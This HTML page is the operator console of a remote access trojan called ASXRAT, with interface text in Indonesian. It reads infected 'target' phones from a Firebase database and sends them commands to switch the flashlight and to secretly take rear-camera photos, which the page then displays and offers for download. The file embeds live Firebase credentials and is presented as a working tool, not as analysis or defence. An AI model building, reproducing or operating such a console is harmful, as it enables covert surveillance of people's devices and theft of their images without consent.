<!DOCTYPE html>
<html>
<head>
    <title>ASXRAT V1 MASTER TERMINAL</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { background: #000; color: #00f2ff; font-family: 'Courier New', monospace; padding: 20px; }
        .card { border: 2px solid #00f2ff; padding: 15px; margin-bottom: 20px; background: #0a0000; border-radius: 10px; box-shadow: 0 0 15px #00f2ff; }
        .btn { width: 100%; padding: 12px; margin: 5px 0; font-weight: bold; cursor: pointer; border: none; text-transform: uppercase; border-radius: 5px; }
        .btn-flash { background: #ffcc00; color: #000; }
        .btn-snap { background: #00f2ff; color: #000; }
        .btn-off { background: #333; color: #fff; }
        img { width: 100%; max-width: 400px; border: 1px solid #00f2ff; margin-top: 10px; border-radius: 5px; }
        h1 { text-align: center; letter-spacing: 5px; text-shadow: 0 0 10px #00f2ff; color: #fff; }
    </style>
</head>
<body>

    <h1>ASXRAT V1 | CONTROL PANEL</h1>
    <div id="targetList">Scanning Perangkat di Database...</div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBfeY-xJ4TQWrQq8IZwwsigP9jwPpstThk",
            authDomain: "control-rat.firebaseapp.com",
            databaseURL: "https://control-rat-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "control-rat",
            storageBucket: "control-rat.appspot.com",
            messagingSenderId: "181283651682",
            appId: "1:181283651682:web:42a169e6daaad00f7e513b"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        db.ref('targets').on('value', (s) => {
            const list = document.getElementById('targetList');
            list.innerHTML = "";
            s.forEach(child => {
                const id = child.key;
                const data = child.val();
                list.innerHTML += `
                <div class="card">
                    <h3 style="color:#ff0000; margin-top:0;">📱 DEVICE: ${data.model}</h3>
                    <p style="font-size:12px;">TARGET ID: ${id} | TIME: ${data.time || '-'}</p>
                    
                    <button class="btn btn-flash" onclick="send('${id}','flash','on')">🔦 SENTER ON</button>
                    <button class="btn btn-off" onclick="send('${id}','flash','off')">SENTER OFF</button>
                    <button class="btn btn-snap" onclick="send('${id}','snap','')">📸 SNAP CAMERA BELAKANG</button>
                    
                    <div id="box_${id}">
                        ${data.foto ? `
                            <p style="color:#0f0">FOTO BERHASIL DITARIK:</p>
                            <img src="${data.foto}">
                            <br>
                            <a href="${data.foto}" download="ASX_${data.model}.jpg">
                                <button class="btn" style="background:#fff; color:#000">📥 SIMPAN KE GALERI</button>
                            </a>
                        ` : '<p style="color:#444">Belum ada foto yang diambil.</p>'}
                    </div>
                </div>`;
            });
        });

        function send(id, type, stat) {
            db.ref('commands/' + id).set({ type: type, status: stat });
        }
    </script>
</body>
</html>
